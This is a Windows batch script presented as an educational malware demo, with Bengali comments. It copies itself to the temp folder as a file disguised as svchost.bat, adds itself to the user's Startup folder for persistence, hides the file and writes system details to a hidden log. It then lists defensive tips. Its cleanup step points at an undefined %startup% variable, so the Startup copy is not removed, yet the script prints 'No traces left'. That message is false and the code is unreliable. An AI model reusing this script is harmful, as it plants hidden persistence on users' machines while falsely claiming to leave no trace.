@echo off
:: ==========================================
:: EDUCATIONAL MALWARE LOGIC DEMO
:: THIS IS FOR LEARNING DEFENSE ONLY
:: DO NOT USE MALICIOUSLY
:: ==========================================

setlocal enabledelayedexpansion

:: PHASE 1: DROPPER - নিজেকে কপি করা
copy "%~f0" "%temp%\svchost.bat" >nul
echo [Phase 1] Dropper: Copied to temp as svchost.bat

:: PHASE 2: PERSISTENCE - Startup এ যোগ
copy "%temp%\svchost.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
echo [Phase 2] Persistence: Added to startup

:: PHASE 3: HIDING - ফাইল লুকানো
attrib +h "%temp%\svchost.bat"
echo [Phase 3] Hiding: File hidden

:: PHASE 4: DATA COLLECTION - সিস্টেম ইনফো নেওয়া
set logfile=%temp%\sysinfo_%random%.tmp
(
    echo Computer: %computername%
    echo User: %username%
    echo Date: %date%
    echo Time: %time%
    echo OS: %os%
) > %logfile%
attrib +h %logfile%
echo [Phase 4] Data Collection: System info saved

:: PHASE 5: LEGITIMATE END - শিক্ষামূলক উদ্দেশ্যে এখানে থামছে
echo.
echo ==========================================
echo DEMO COMPLETE - Educational Purpose Only
echo ==========================================
echo.
echo Key Takeaways for Defense:
echo 1. Always check Startup folder for unknown scripts
echo 2. Use "schtasks /query" to see scheduled tasks
echo 3. Check Temp folder for hidden .bat/.vbs/.ps1 files
echo 4. Monitor "attrib +h" usage on unknown files
echo 5. Use Windows Defender / Anti-Virus regularly
echo.
echo Press any key to clean up demo files...
pause >nul

:: CLEANUP - নিজের তৈরি করা ফাইল মুছে ফেলা
attrib -h "%temp%\svchost.bat" 2>nul
del "%temp%\svchost.bat" 2>nul
del "%startup%\svchost.bat" 2>nul
attrib -h "%logfile%" 2>nul
del "%logfile%" 2>nul
echo Cleanup done. No traces left.
pause